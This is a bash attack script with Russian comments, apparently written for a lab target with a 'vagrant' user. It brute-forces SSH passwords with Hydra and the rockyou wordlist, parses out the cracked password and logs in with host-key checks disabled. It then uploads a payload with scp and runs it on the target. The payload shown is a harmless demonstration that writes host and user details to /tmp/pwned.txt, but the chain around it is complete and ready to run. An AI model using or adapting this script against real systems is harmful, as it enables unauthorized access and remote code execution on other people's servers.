#!/bin/bash

# Конфиги
TARGET_IP="33.57.84.200"
TARGET_PORT="22"
TARGET_USER="vagrant" 
WORDLIST="rockyou.txt"
PAYLOAD_FILE="payload.sh" 
LOG_FILE="attack_log.txt"
PASSWORD=""

echo "[*] Начинаем атаку на $TARGET_IP:$TARGET_PORT"
echo "[*] $(date)" >> $LOG_FILE

# Bruteforce SSH пароля с помощью Hydra
echo "[+] 1. Bruteforce пароля с помощью Hydra..."
# Запускаем Hydra и парсим вывод в реальном времени
while IFS= read -r line; do
    echo "$line" | tee -a $LOG_FILE
    
    # Ищем строку с найденным паролем
    # Формат: [22][ssh] host: 33.57.84.200   login: root   password: PASSWORD123
    if echo "$line" | grep -q "\[22\]\[ssh\]"; then
        PASSWORD=$(echo "$line" | grep -oP 'password:\s*\K[^\]]*' | xargs)
        if [ ! -z "$PASSWORD" ]; then
            echo "[+] Пароль найден: $PASSWORD" | tee -a $LOG_FILE
            break
        fi
    fi
done < <(hydra -l $TARGET_USER -P $WORDLIST -v \
    ssh://$TARGET_IP:$TARGET_PORT 2>&1)

# Проверяем, найден ли пароль
if [ -z "$PASSWORD" ]; then
    echo "[-] Пароль не найден" | tee -a $LOG_FILE
    exit 1
fi

echo "[+] Пароль найден: $PASSWORD" | tee -a $LOG_FILE

# Проверяем подключение
echo "[+] 2. Проверка подключения SSH..." | tee -a $LOG_FILE
sleep 2
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    $TARGET_USER@$TARGET_IP "echo 'SSH connection successful'" 2>&1 | tee -a $LOG_FILE

if [ $? -ne 0 ]; then
    echo "[-] Не удалось подключиться по SSH" | tee -a $LOG_FILE
    exit 1
fi

echo "[+] SSH подключение успешно!" | tee -a $LOG_FILE

# Загружаем и выполняем payload
echo "[+] 3. Загрузка вредоноса на целевой сервер..." | tee -a $LOG_FILE

# Создаём простой payload, если его нет
if [ ! -f "$PAYLOAD_FILE" ]; then
    cat > $PAYLOAD_FILE << 'EOF'
#!/bin/bash
# Простой вредоносный payload для демонстрации
echo "Payload executed on $(hostname) at $(date)" > /tmp/pwned.txt
echo "User: $(whoami)" >> /tmp/pwned.txt
echo "Current directory: $(pwd)" >> /tmp/pwned.txt
EOF
    chmod +x $PAYLOAD_FILE
    echo "[+] Payload создан: $PAYLOAD_FILE" | tee -a $LOG_FILE
fi

# Загружаем payload через SCP
sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    $PAYLOAD_FILE $TARGET_USER@$TARGET_IP:/tmp/payload.sh 2>&1 | tee -a $LOG_FILE

if [ $? -ne 0 ]; then
    echo "[-] Не удалось загрузить файл" | tee -a $LOG_FILE
    exit 1
fi

echo "[+] Payload загружен" | tee -a $LOG_FILE

# Выполняем payload
echo "[+] 4. Выполнение полезной нагрузки на целевом сервере..."
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    $TARGET_USER@$TARGET_IP "/tmp/payload.sh" 2>&1 | tee -a $LOG_FILE

echo "[+] Payload выполнен" | tee -a $LOG_FILE

# Проверяем результаты
echo "[+] 5. Проверка результатов на целевом сервере..."
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    $TARGET_USER@$TARGET_IP "cat /tmp/pwned.txt" 2>&1 | tee -a $LOG_FILE

echo "[+] Атака завершена" | tee -a $LOG_FILE
